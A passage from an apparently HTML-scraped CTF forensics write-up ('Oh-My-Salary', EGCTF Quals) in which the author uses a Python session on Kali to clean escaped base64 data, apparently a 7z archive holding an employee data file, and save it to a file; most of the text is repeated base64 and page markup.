bzY8kDeJkYuaNasEHX5QtsEX64RERw38b4dFGxayy2121cHBIvgSy7F+p8tGr&#x2F;TAMvk\nS95mq2hCNH+eWAaYbN5KZXCESEMGcRqINziqAwPvtvyltGoshg3ltuZlHLxOZzR8ZkowZSoV5fgo\ng9pSEUGBtBMq2qtDBLlymITFTp3MCFeOb+N+eDgfeFci8hEwnWUjDVoYCgobi48TOb7ABFMXtyiq\nwswb6ISphq0MJTsAq4s2xN7jOC&#x2F;2axOqojgr7S3hmLjp4wUxKMdnofRW2jTxnsNnRadGguu&#x2F;EBYf\nWSHHKKzsdwgJXm+Y0KevgXMn&#x2F;Pc4qudjB&#x2F;KHlrVDifWCC&#x2F;JFMilPhkp4b1AYhryG2qSQTFH0M2l5\nUUYgXSsr1L9Qu512OqpDx4&#x2F;RRXM8IYilCfwAFz9Ahd7bz4HrJ60WmxJcpkzght6AfPAyg0iI334j\nnmsF9EZWuULIrg9V3kDaicX2IJqtQmn0jffRWmE3N8PqzO6NlMIMLWfP3C0HImct5iHAoWvkHpIZ\nC9dfbTfUY9SgSfF8kqWyF61NN0m&#x2F;tuhjc2SDUvHozoOuJrI1ym4zbt&#x2F;O2keRRBfgeBvo4idO85wP\nXSZnHukci9YTr6Yuegif9ZmU5iPyevxieCGVx8+1LTHHXRdLoTVAKd4pLD0&#x2F;v&#x2F;HziHLz6TL2o3Z9\na3HzhW3On3NM61mDqktNIqlZcEQTjZsw4KcP+EqSETHdb104M1PRxwPnS48DSnsEEOKEJuCULSjm\nA9pwgloS&#x2F;lQ&#x2F;OoS9r8jgwNQh3rXwuMeZCCrLSgiTVvVMP8UPH24QMQz3SjVn&#x2F;K&#x2F;MkhVQZLh3P8wE\nUzQd&#x2F;891HbbBwGpuPcnxMXFyJt055EpBNz65f&#x2F;&#x2F;kV0RHvtqXgLKuKWLduEv&#x2F;ZLxMWclnIDWOdZzQ\nuriMG0zHRZeLWNDlUmKf3nzFYQEX&#x2F;27RW5Iwy&#x2F;Op&#x2F;qsAb86&#x2F;+erv5AA616Wf2EyL2Kl6GaBW0EVK\n8LAr1fdxzV&#x2F;+D&#x2F;GaX4xeCbrdv&#x2F;i49TEelUQ2Ut7hNlmqWo09r+1zZZsHo9jsrfUUQfmvoKZhvFuR\nefISfOWWyCoCmxHkyuP5IrW39G78xGMD6pE+2DqExH1Et8VWCBGXYnz&#x2F;6BEHM54xYIzN8QbeSwqx\ndKeB4y3jo7NvSfes5T6&#x2F;Z+WRn3CJ&#x2F;N4WDYfugACnSlk6BAx83OC+yV41PcjsLHS6x3o1HsOmXwBj\nz&#x2F;fDuXnAxXvO6bhkVWB&#x2F;Byvp9blK2Y7995M2Gx9U826Cj&#x2F;vY+OWbFi8ifLEvulVBMyRpONsJ5CuI\nZZ2nw6QeVYk2OA8H8+68DcIrArhaH4qaaOLPIny+VRCZ21MF0GzjDZkHJC+k0fH8cdI7aTuXVw0O\nnr8zGZ7rUNgyn7f14thYnqg9C1E+uPgqTp9bPhDuDHG0PApvj4fnORvGzZCU8YfZE22MGhGihTgA\ngmGHshEDvlP&#x2F;LICC5RPTCR7LwOtmPZeRlbA9C8bl&#x2F;UwM4h7Az8a1089Uj8PuRvNOz8Mp3t717KHJ\nOtl0iy++jHj0qfpXkNn3BqmM7FsaP8Opn4efg6UI0nVg8kQqcD5KjWNVyd&#x2F;&#x2F;Wbnxoo4stjr4DOy7\nLI9Y9kO56NYZ9R54EiXw9UsyXnN4lvy62Al2rjRcpcA2yrK&#x2F;d52aDjP91AY0Q7PEHG3t++MG0jKl\nVEUPElOjyIQLbFcAAgv0omnHIfG3WrybE1AxVvAq25mxsS7NuyAQTs1+VOIbN+ZICRL9R6q9BXH+\nJ1yYwjPysIlEyUEfWsGFynPtAGdjtXA8hsDcWZU&#x2F;k1RFDlYu2w0jAQQGAAEJivAABwsBAAIkBvEH\nAQpTBwRUId45GliZISEBBQEADIrlwMxEAAgKAY5g2lMAAAUBGQUAAAAAABElAGUAbQBwAGwAbwB5\nAGUAZQBfAGQAYQB0AGEALgB0AHgAdAAAABQKAQDQbKHeApTVARUGAQAgAAAAAAA&#x3D;\n</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary#</span><br></pre></td></tr></table></figure><p>If you look carefully you’ll notice that it has a lot of new line escapes, so I used <code>python</code> to print the final base-64 data and save them into a file:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# python</span><br><span class="line">Python 2.7.16 (default, Apr  6 2019, 01:42:57)   </span><br><span class="line">[GCC 8.3.0] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.          </span><br><span class="line">&gt;&gt;&gt; print(&quot;N3q8ryccAATIxWF+8AoAAAAAAAB6AAAAAAAAANY3kCg6AWnJIc9uESaH5GfcRZ9lKuuWZ&#x2F;LK8Hnb\nmS+E+XYT7fZ3Nfq4zT1z+BAI9wL3lV5Jsiv&#x2F;n2EvBE4vc1+PHg&#x2F;L6QN9AfNG4KihNI8kLHOy02Cz\nJQzLFdT0Zei85AS3CZGZeRQBS+v&#x2F;U5HYv7AU6K67BU5v</span><br><span class="line">I+WQn3cVlc8WqbXm9bpqkwnvncy&#x2F;xsTG\nzoMY03OBXLJUU&#x2F;2jFsF2DOPI+uP6a3t8k5n2NaJGiRF0PsRXk2blrpTc1IFaIYI3ArmjWTuLVxYD\nohLpRppUt4+S4iOMX4AYXrzPNUL4zwEisXj8zAh4RB+E+y&#x2F;8nmXXzh0Pvn4aQAfw3ZsM4TWyQLVa\nUosmZu9rUICrUlRcskmZD</span><br><span class="line">D25WukXczXGe6lPwzDozKXmfgErTIPv7vJr57nDJffROYagZoAuW2eb\n3OVaeEfPnESeJHKULhXhfFtbqfVUOeU8TUVcym+47hEg8pTasXdPwbsRfjS+HpAJSAZ2pMtVPhXL\nO2AKQBpw70DoQpgHtk84S+hkbE4RALliYcoEPpQSP9GSSFlOV5wQiD9Xv&#x2F;GTdQ+Cvx+PUYYfTAlI</span><br><span class="line">\nfyNvE4KgrnV03LqhFN7jKJSPImvz6BlPp&#x2F;wyu2ar+3qjxFfnivSz8Vzmp+fA69gO6xI1WyMT7SfL\nF0PmjtVSR052JmKwvbrfTrFqaef4PfW5fOedyz4&#x2F;trqE7+xBHqwKqQf8dFUra87uec&#x2F;VruMJKbuO\nH0sJSCaURkVBFBre9grg0mlXKmxu88ovko5LOLq+S1A1e7DALF6zI</span><br><span class="line">9NzEIMp61r0ZISAC5RBir+3\nIk5xI0vJN+yEgFUzDCYkPJG7F8&#x2F;76K+m&#x2F;vgas20WxZTAj+6fpZRVQazxvq+f+ZvrXoPnF5eFKvqF\nqlPHOFn1L1urXts61aFTg+4epVK9JxfPx&#x2F;6q2iA6Gnw2LHGG4ZkviC7FiOd+GF3ysRd25SOuXUit\njkjUmRQoatL1RVQMbyp9KBkyRnjFUs</span><br><span class="line">9OWwHOkbYgl4REJ&#x2F;qGd7HMW4h8FeklkQ5Mjv1Sb&#x2F;fje9RA\n&#x2F;KxC+KzXoRqexkSBSoxc48zOTbhuAxyDMG5tw1i5SNoLDqYU+u1MkYzUFv5G7cxrhSnE925Qt49t\nvVYboHky0jbgilGqU3j4tRQS2nSf3AskOrW4Fef2VyZVSJ1QKECoJg6cn7sXgG&#x2F;5eZvczXAAzsIk\nyf&#x2F;Beb4</span><br><span class="line">&#x2F;IFc3EIn0L8inS2Ds5rXUq0EyHaqyXwmR2gi1H8T4i9AHsB4HKFD91ThW&#x2F;agKel8K2BvW\n0Oawglav&#x2F;RZx4VtOIAkz&#x2F;j8wvnE6AvA87mbC+bWSUmpE&#x2F;3m9FuzG6aeMFrPvFJef6C8tLR5VhXWA\nh7zh52kaDTGlFDLnHmUUl99NmKhMqD6rinO6lMVUN1XnqEnftcAtfMeTGtte3i</span><br><span class="line">B5&#x2F;hwziuiGcekZ\nFKxMLhAM1w5OI0XwbMBvMcgDRMcGS7mLLeVqUrrJpv0&#x2F;AZ50ilbsop5vamOxFslt70rsJrQI4K7r\norGwlzC8oLqKxlfToV69j2bgSutxjZeJ6eIYhWkoWRWZ0qaaRdM1gDOvr6Swuq2Bz3e+UB7QAfc&#x2F;\n7S8HL8X6SFa14WkQlXbv63ACkhAbFmDL664u8MM</span><br><span class="line">S6yjukmmBwWILaSjn70HLTSbYYFJFDvsSX4C4\nKxPXprYvHpZYRN7QJ8Z6wh0+8WLGkexFgQ+5gp38ITKw2ZbEpUhyZ7g56pzXzcZ4Ao26imPCPPCM\nkxEjQNb25GazGW1ZeFRBuChEDRGhyHpVBrjHAVEOGHslXDlfiYCBxx4zHAbzl1bY2+JcYPSQysbP\n9Azm8dyjhwFxLTLi</span><br><span class="line">2oijgKt6ebc6yqGkCXYw7Lz35Sv9RlvjxhUDuomszKEx4igGFrfATGZflZWe\neSs&#x2F;oNSX2hIB3Z+Q&#x2F;CmF7&#x2F;iTtL+1&#x2F;3ppRNfclN6cf6xwkKQDay9+8LW87vHYDdUkyDGebhJVgUEU\nhkVqh84+ybzY8kDeJkYuaNasEHX5QtsEX64RERw38b4dFGxayy2121cHBIvgSy7F+p8tGr&#x2F;</span><br><span class="line">TAMvk\nS95mq2hCNH+eWAaYbN5KZXCESEMGcRqINziqAwPvtvyltGoshg3ltuZlHLxOZzR8ZkowZSoV5fgo\ng9pSEUGBtBMq2qtDBLlymITFTp3MCFeOb+N+eDgfeFci8hEwnWUjDVoYCgobi48TOb7ABFMXtyiq\nwswb6ISphq0MJTsAq4s2xN7jOC&#x2F;2axOqojgr7S3hmLjp4wUx</span><br><span class="line">KMdnofRW2jTxnsNnRadGguu&#x2F;EBYf\nWSHHKKzsdwgJXm+Y0KevgXMn&#x2F;Pc4qudjB&#x2F;KHlrVDifWCC&#x2F;JFMilPhkp4b1AYhryG2qSQTFH0M2l5\nUUYgXSsr1L9Qu512OqpDx4&#x2F;RRXM8IYilCfwAFz9Ahd7bz4HrJ60WmxJcpkzght6AfPAyg0iI334j\nnmsF9EZWuULIrg9V3kDaicX2I</span><br><span class="line">JqtQmn0jffRWmE3N8PqzO6NlMIMLWfP3C0HImct5iHAoWvkHpIZ\nC9dfbTfUY9SgSfF8kqWyF61NN0m&#x2F;tuhjc2SDUvHozoOuJrI1ym4zbt&#x2F;O2keRRBfgeBvo4idO85wP\nXSZnHukci9YTr6Yuegif9ZmU5iPyevxieCGVx8+1LTHHXRdLoTVAKd4pLD0&#x2F;v&#x2F;HziHLz6TL2o3Z9\na3</span><br><span class="line">HzhW3On3NM61mDqktNIqlZcEQTjZsw4KcP+EqSETHdb104M1PRxwPnS48DSnsEEOKEJuCULSjm\nA9pwgloS&#x2F;lQ&#x2F;OoS9r8jgwNQh3rXwuMeZCCrLSgiTVvVMP8UPH24QMQz3SjVn&#x2F;K&#x2F;MkhVQZLh3P8wE\nUzQd&#x2F;891HbbBwGpuPcnxMXFyJt055EpBNz65f&#x2F;&#x2F;kV0RHvtqXgLKuKWLdu</span><br><span class="line">Ev&#x2F;ZLxMWclnIDWOdZzQ\nuriMG0zHRZeLWNDlUmKf3nzFYQEX&#x2F;27RW5Iwy&#x2F;Op&#x2F;qsAb86&#x2F;+erv5AA616Wf2EyL2Kl6GaBW0EVK\n8LAr1fdxzV&#x2F;+D&#x2F;GaX4xeCbrdv&#x2F;i49TEelUQ2Ut7hNlmqWo09r+1zZZsHo9jsrfUUQfmvoKZhvFuR\nefISfOWWyCoCmxHkyuP5IrW39G78xGMD6p</span><br><span class="line">E+2DqExH1Et8VWCBGXYnz&#x2F;6BEHM54xYIzN8QbeSwqx\ndKeB4y3jo7NvSfes5T6&#x2F;Z+WRn3CJ&#x2F;N4WDYfugACnSlk6BAx83OC+yV41PcjsLHS6x3o1HsOmXwBj\nz&#x2F;fDuXnAxXvO6bhkVWB&#x2F;Byvp9blK2Y7995M2Gx9U826Cj&#x2F;vY+OWbFi8ifLEvulVBMyRpONsJ5CuI\nZZ2nw6QeVYk</span><br><span class="line">2OA8H8+68DcIrArhaH4qaaOLPIny+VRCZ21MF0GzjDZkHJC+k0fH8cdI7aTuXVw0O\nnr8zGZ7rUNgyn7f14thYnqg9C1E+uPgqTp9bPhDuDHG0PApvj4fnORvGzZCU8YfZE22MGhGihTgA\ngmGHshEDvlP&#x2F;LICC5RPTCR7LwOtmPZeRlbA9C8bl&#x2F;UwM4h7Az8a1089Uj8PuRvNOz8</span><br><span class="line">Mp3t717KHJ\nOtl0iy++jHj0qfpXkNn3BqmM7FsaP8Opn4efg6UI0nVg8kQqcD5KjWNVyd&#x2F;&#x2F;Wbnxoo4stjr4DOy7\nLI9Y9kO56NYZ9R54EiXw9UsyXnN4lvy62Al2rjRcpcA2yrK&#x2F;d52aDjP91AY0Q7PEHG3t++MG0jKl\nVEUPElOjyIQLbFcAAgv0omnHIfG3WrybE1AxVvAq25m</span><br><span class="line">xsS7NuyAQTs1+VOIbN+ZICRL9R6q9BXH+\nJ1yYwjPysIlEyUEfWsGFynPtAGdjtXA8hsDcWZU&#x2F;k1RFDlYu2w0jAQQGAAEJivAABwsBAAIkBvEH\nAQpTBwRUId45GliZISEBBQEADIrlwMxEAAgKAY5g2lMAAAUBGQUAAAAAABElAGUAbQBwAGwAbwB5\nAGUAZQBfAGQAYQB0AGEA</span><br><span class="line">LgB0AHgAdAAAABQKAQDQbKHeApTVARUGAQAgAAAAAAA&#x3D;\n&quot;)</span><br><span class="line">N3q8ryccAATIxWF+8AoAAAAAAAB6AAAAAAAAANY3kCg6AWnJIc9uESaH5GfcRZ9lKuuWZ&#x2F;LK8Hnb</span><br><span class="line">mS+E+XYT7fZ3Nfq4zT1z+BAI9wL3lV5Jsiv&#x2F;n2EvBE4vc1+PHg&#x2F;L6QN9AfNG4KihNI8kLHOy02Cz</span><br><span class="line">JQzLFdT0Zei85AS3CZGZeRQBS+v&#x2F;U5HYv7AU6K67BU5vI+WQn3cVlc8WqbXm9bpqkwnvncy&#x2F;xsTG   </span><br><span class="line">zoMY03OBXLJUU&#x2F;2jFsF2DOPI+uP6a3t8k5n2NaJGiRF0PsRXk2blrpTc1IFaIYI3ArmjWTuLVxYD</span><br><span class="line">ohLpRppUt4+S4iOMX4AYXrzPNUL4zwEisXj8zAh4RB+E+y&#x2F;8nmXXzh0Pvn4aQAfw3ZsM4TWyQLVa</span><br><span class="line">UosmZu9rUICrUlRcskmZDD25WukXczXGe6lPwzDozKXmfgErTIPv7vJr57nDJffROYagZoAuW2eb</span><br><span class="line">3OVaeEfPnESeJHKULhXhfFtbqfVUOeU8TUVcym+47hEg8pTasXdPwbsRfjS+HpAJSAZ2pMtVPhXL</span><br><span class="line">O2AKQBpw70DoQpgHtk84S+hkbE4RALliYcoEPpQSP9GSSFlOV5wQiD9Xv&#x2F;GTdQ+Cvx+PUYYfTAlI</span><br><span class="line">fyNvE4KgrnV03LqhFN7jKJSPImvz6BlPp&#x2F;wyu2ar+3qjxFfnivSz8Vzmp+fA69gO6xI1WyMT7SfL</span><br><span class="line">F0PmjtVSR052JmKwvbrfTrFqaef4PfW5fOedyz4&#x2F;trqE7+xBHqwKqQf8dFUra87uec&#x2F;VruMJKbuO</span><br><span class="line">H0sJSCaURkVBFBre9grg0mlXKmxu88ovko5LOLq+S1A1e7DALF6zI9NzEIMp61r0ZISAC5RBir+3</span><br><span class="line">Ik5xI0vJN+yEgFUzDCYkPJG7F8&#x2F;76K+m&#x2F;vgas20WxZTAj+6fpZRVQazxvq+f+ZvrXoPnF5eFKvqF</span><br><span class="line">qlPHOFn1L1urXts61aFTg+4epVK9JxfPx&#x2F;6q2iA6Gnw2LHGG4ZkviC7FiOd+GF3ysRd25SOuXUit</span><br><span class="line">jkjUmRQoatL1RVQMbyp9KBkyRnjFUs9OWwHOkbYgl4REJ&#x2F;qGd7HMW4h8FeklkQ5Mjv1Sb&#x2F;fje9RA</span><br><span class="line">&#x2F;KxC+KzXoRqexkSBSoxc48zOTbhuAxyDMG5tw1i5SNoLDqYU+u1MkYzUFv5G7cxrhSnE925Qt49t</span><br><span class="line">vVYboHky0jbgilGqU3j4tRQS2nSf3AskOrW4Fef2VyZVSJ1QKECoJg6cn7sXgG&#x2F;5eZvczXAAzsIk</span><br><span class="line">yf&#x2F;Beb4&#x2F;IFc3EIn0L8inS2Ds5rXUq0EyHaqyXwmR2gi1H8T4i9AHsB4HKFD91ThW&#x2F;agKel8K2BvW</span><br><span class="line">0Oawglav&#x2F;RZx4VtOIAkz&#x2F;j8wvnE6AvA87mbC+bWSUmpE&#x2F;3m9FuzG6aeMFrPvFJef6C8tLR5VhXWA</span><br><span class="line">h7zh52kaDTGlFDLnHmUUl99NmKhMqD6rinO6lMVUN1XnqEnftcAtfMeTGtte3iB5&#x2F;hwziuiGcekZ</span><br><span class="line">FKxMLhAM1w5OI0XwbMBvMcgDRMcGS7mLLeVqUrrJpv0&#x2F;AZ50ilbsop5vamOxFslt70rsJrQI4K7r</span><br><span class="line">orGwlzC8oLqKxlfToV69j2bgSutxjZeJ6eIYhWkoWRWZ0qaaRdM1gDOvr6Swuq2Bz3e+UB7QAfc&#x2F;</span><br><span class="line">7S8HL8X6SFa14WkQlXbv63ACkhAbFmDL664u8MMS6yjukmmBwWILaSjn70HLTSbYYFJFDvsSX4C4</span><br><span class="line">KxPXprYvHpZYRN7QJ8Z6wh0+8WLGkexFgQ+5gp38ITKw2ZbEpUhyZ7g56pzXzcZ4Ao26imPCPPCM</span><br><span class="line">kxEjQNb25GazGW1ZeFRBuChEDRGhyHpVBrjHAVEOGHslXDlfiYCBxx4zHAbzl1bY2+JcYPSQysbP</span><br><span class="line">9Azm8dyjhwFxLTLi2oijgKt6ebc6yqGkCXYw7Lz35Sv9RlvjxhUDuomszKEx4igGFrfATGZflZWe</span><br><span class="line">eSs&#x2F;oNSX2hIB3Z+Q&#x2F;CmF7&#x2F;iTtL+1&#x2F;3ppRNfclN6cf6xwkKQDay9+8LW87vHYDdUkyDGebhJVgUEU</span><br><span class="line">hkVqh84+ybzY8kDeJkYuaNasEHX5QtsEX64RERw38b4dFGxayy2121cHBIvgSy7F+p8tGr&#x2F;TAMvk</span><br><span class="line">S95mq2hCNH+eWAaYbN5KZXCESEMGcRqINziqAwPvtvyltGoshg3ltuZlHLxOZzR8ZkowZSoV5fgo</span><br><span class="line">g9pSEUGBtBMq2qtDBLlymITFTp3MCFeOb+N+eDgfeFci8hEwnWUjDVoYCgobi48TOb7ABFMXtyiq</span><br><span class="line">wswb6ISphq0MJTsAq4s2xN7jOC&#x2F;2axOqojgr7S3hmLjp4wUxKMdnofRW2jTxnsNnRadGguu&#x2F;EBYf</span><br><span class="line">WSHHKKzsdwgJXm+Y0KevgXMn&#x2F;Pc4qudjB&#x2F;KHlrVDifWCC&#x2F;JFMilPhkp4b1AYhryG2qSQTFH0M2l5</span><br><span class="line">UUYgXSsr1L9Qu512OqpDx4&#x2F;RRXM8IYilCfwAFz9Ahd7bz4HrJ60WmxJcpkzght6AfPAyg0iI334j</span><br><span class="line">nmsF9EZWuULIrg9V3kDaicX2IJqtQmn0jffRWmE3N8PqzO6NlMIMLWfP3C0HImct5iHAoWvkHpIZ</span><br><span class="line">C9dfbTfUY9SgSfF8kqWyF61NN0m&#x2F;tuhjc2SDUvHozoOuJrI1ym4zbt&#x2F;O2keRRBfgeBvo4idO85wP</span><br><span class="line">XSZnHukci9YTr6Yuegif9ZmU5iPyevxieCGVx8+1LTHHXRdLoTVAKd4pLD0&#x2F;v&#x2F;HziHLz6TL2o3Z9</span><br><span class="line">a3HzhW3On3NM61mDqktNIqlZcEQTjZsw4KcP+EqSETHdb104M1PRxwPnS48DSnsEEOKEJuCULSjm</span><br><span class="line">A9pwgloS&#x2F;lQ&#x2F;OoS9r8jgwNQh3rXwuMeZCCrLSgiTVvVMP8UPH24QMQz3SjVn&#x2F;K&#x2F;MkhVQZLh3P8wE</span><br><span class="line">UzQd&#x2F;891HbbBwGpuPcnxMXFyJt055EpBNz65f&#x2F;&#x2F;kV0RHvtqXgLKuKWLduEv&#x2F;ZLxMWclnIDWOdZzQ</span><br><span class="line">uriMG0zHRZeLWNDlUmKf3nzFYQEX&#x2F;27RW5Iwy&#x2F;Op&#x2F;qsAb86&#x2F;+erv5AA616Wf2EyL2Kl6GaBW0EVK</span><br><span class="line">8LAr1fdxzV&#x2F;+D&#x2F;GaX4xeCbrdv&#x2F;i49TEelUQ2Ut7hNlmqWo09r+1zZZsHo9jsrfUUQfmvoKZhvFuR</span><br><span class="line">efISfOWWyCoCmxHkyuP5IrW39G78xGMD6pE+2DqExH1Et8VWCBGXYnz&#x2F;6BEHM54xYIzN8QbeSwqx</span><br><span class="line">dKeB4y3jo7NvSfes5T6&#x2F;Z+WRn3CJ&#x2F;N4WDYfugACnSlk6BAx83OC+yV41PcjsLHS6x3o1HsOmXwBj</span><br><span class="line">z&#x2F;fDuXnAxXvO6bhkVWB&#x2F;Byvp9blK2Y7995M2Gx9U826Cj&#x2F;vY+OWbFi8ifLEvulVBMyRpONsJ5CuI</span><br><span class="line">ZZ2nw6QeVYk2OA8H8+68DcIrArhaH4qaaOLPIny+VRCZ21MF0GzjDZkHJC+k0fH8cdI7aTuXVw0O</span><br><span class="line">nr8zGZ7rUNgyn7f14thYnqg9C1E+uPgqTp9bPhDuDHG0PApvj4fnORvGzZCU8YfZE22MGhGihTgA</span><br><span class="line">gmGHshEDvlP&#x2F;LICC5RPTCR7LwOtmPZeRlbA9C8bl&#x2F;UwM4h7Az8a1089Uj8PuRvNOz8Mp3t717KHJ</span><br><span class="line">Otl0iy++jHj0qfpXkNn3BqmM7FsaP8Opn4efg6UI0nVg8kQqcD5KjWNVyd&#x2F;&#x2F;Wbnxoo4stjr4DOy7</span><br><span class="line">LI9Y9kO56NYZ9R54EiXw9UsyXnN4lvy62Al2rjRcpcA2yrK&#x2F;d52aDjP91AY0Q7PEHG3t++MG0jKl</span><br><span class="line">VEUPElOjyIQLbFcAAgv0omnHIfG3WrybE1AxVvAq25mxsS7NuyAQTs1+VOIbN+ZICRL9R6q9BXH+</span><br><span class="line">J1yYwjPysIlEyUEfWsGFynPtAGdjtXA8hsDcWZU&#x2F;k1RFDlYu2w0jAQQGAAEJivAABwsBAAIkBvEH</span><br><span class="line">AQpTBwRUId45GliZISEBBQEADIrlwMxEAAgKAY5g2lMAAAUBGQUAAAAAABElAGUAbQBwAGwAbwB5</span><br><span class="line">AGUAZQBfAGQAYQB0AGEALgB0AHgAdAAAABQKAQDQbKHeApTVARUGAQAgAAAAAAA&#x3D;</span><br><span class="line">&gt;&gt;&gt; with open(&quot;final.b64&quot;,&quot;w&quot;) as f:</span><br><span class="line">...     f.write(&quot;N3q8ryccAATIxWF+8AoAAAAAAAB6AAAAAAAAANY3kCg6AWnJIc9uESaH5GfcRZ9lKuuWZ&#x2F;LK8Hnb\nmS+E+XYT7fZ3Nfq4zT1z+BAI9wL3lV5Jsiv&#x2F;n2EvBE4vc1+PHg&#x2F;L6QN9AfNG4KihNI8kLHOy02Cz\nJQzLFdT0Zei85AS3CZGZeRQBS+v&#x2F;U5HYv7AU6K</span><br><span class="line">67BU5vI+WQn3cVlc8WqbXm9bpqkwnvncy&#x2F;xsTG\nzoMY03OBXLJUU&#x2F;2jFsF2DOPI+uP6a3t8k5n2NaJGiRF0PsRXk2blrpTc1IFaIYI3ArmjWTuLVxYD\nohLpRppUt4+S4iOMX4AYXrzPNUL4zwEisXj8zAh4RB+E+y&#x2F;8nmXXzh0Pvn4aQAfw3ZsM4TWyQLVa\nUosmZu9rUICrUlR</span><br><span class="line">cskmZDD25WukXczXGe6lPwzDozKXmfgErTIPv7vJr57nDJffROYagZoAuW2eb\n3OVaeEfPnESeJHKULhXhfFtbqfVUOeU8TUVcym+47hEg8pTasXdPwbsRfjS+HpAJSAZ2pMtVPhXL\nO2AKQBpw70DoQpgHtk84S+hkbE4RALliYcoEPpQSP9GSSFlOV5wQiD9Xv&#x2F;GTdQ+Cvx+PUY</span><br><span class="line">YfTAlI\nfyNvE4KgrnV03LqhFN7jKJSPImvz6BlPp&#x2F;wyu2ar+3qjxFfnivSz8Vzmp+fA69gO6xI1WyMT7SfL\nF0PmjtVSR052JmKwvbrfTrFqaef4PfW5fOedyz4&#x2F;trqE7+xBHqwKqQf8dFUra87uec&#x2F;VruMJKbuO\nH0sJSCaURkVBFBre9grg0mlXKmxu88ovko5LOLq+S1A1e7D</span><br><span class="line">ALF6zI9NzEIMp61r0ZISAC5RBir+3\nIk5xI0vJN+yEgFUzDCYkPJG7F8&#x2F;76K+m&#x2F;vgas20WxZTAj+6fpZRVQazxvq+f+ZvrXoPnF5eFKvqF\nqlPHOFn1L1urXts61aFTg+4epVK9JxfPx&#x2F;6q2iA6Gnw2LHGG4ZkviC7FiOd+GF3ysRd25SOuXUit\njkjUmRQoatL1RVQMbyp9KBky</span><br><span class="line">RnjFUs9OWwHOkbYgl4REJ&#x2F;qGd7HMW4h8FeklkQ5Mjv1Sb&#x2F;fje9RA\n&#x2F;KxC+KzXoRqexkSBSoxc48zOTbhuAxyDMG5tw1i5SNoLDqYU+u1MkYzUFv5G7cxrhSnE925Qt49t\nvVYboHky0jbgilGqU3j4tRQS2nSf3AskOrW4Fef2VyZVSJ1QKECoJg6cn7sXgG&#x2F;5eZvczXAAzsIk\ny</span><br><span class="line">f&#x2F;Beb4&#x2F;IFc3EIn0L8inS2Ds5rXUq0EyHaqyXwmR2gi1H8T4i9AHsB4HKFD91ThW&#x2F;agKel8K2BvW\n0Oawglav&#x2F;RZx4VtOIAkz&#x2F;j8wvnE6AvA87mbC+bWSUmpE&#x2F;3m9FuzG6aeMFrPvFJef6C8tLR5VhXWA\nh7zh52kaDTGlFDLnHmUUl99NmKhMqD6rinO6lMVUN1XnqEnftcAtfMeT</span><br><span class="line">Gtte3iB5&#x2F;hwziuiGcekZ\nFKxMLhAM1w5OI0XwbMBvMcgDRMcGS7mLLeVqUrrJpv0&#x2F;AZ50ilbsop5vamOxFslt70rsJrQI4K7r\norGwlzC8oLqKxlfToV69j2bgSutxjZeJ6eIYhWkoWRWZ0qaaRdM1gDOvr6Swuq2Bz3e+UB7QAfc&#x2F;\n7S8HL8X6SFa14WkQlXbv63ACkhAbFmDL6</span><br><span class="line">64u8MMS6yjukmmBwWILaSjn70HLTSbYYFJFDvsSX4C4\nKxPXprYvHpZYRN7QJ8Z6wh0+8WLGkexFgQ+5gp38ITKw2ZbEpUhyZ7g56pzXzcZ4Ao26imPCPPCM\nkxEjQNb25GazGW1ZeFRBuChEDRGhyHpVBrjHAVEOGHslXDlfiYCBxx4zHAbzl1bY2+JcYPSQysbP\n9Azm8dyjhw</span><br><span class="line">FxLTLi2oijgKt6ebc6yqGkCXYw7Lz35Sv9RlvjxhUDuomszKEx4igGFrfATGZflZWe\neSs&#x2F;oNSX2hIB3Z+Q&#x2F;CmF7&#x2F;iTtL+1&#x2F;3ppRNfclN6cf6xwkKQDay9+8LW87vHYDdUkyDGebhJVgUEU\nhkVqh84+ybzY8kDeJkYuaNasEHX5QtsEX64RERw38b4dFGxayy2121cHBIvgSy7F+</span><br><span 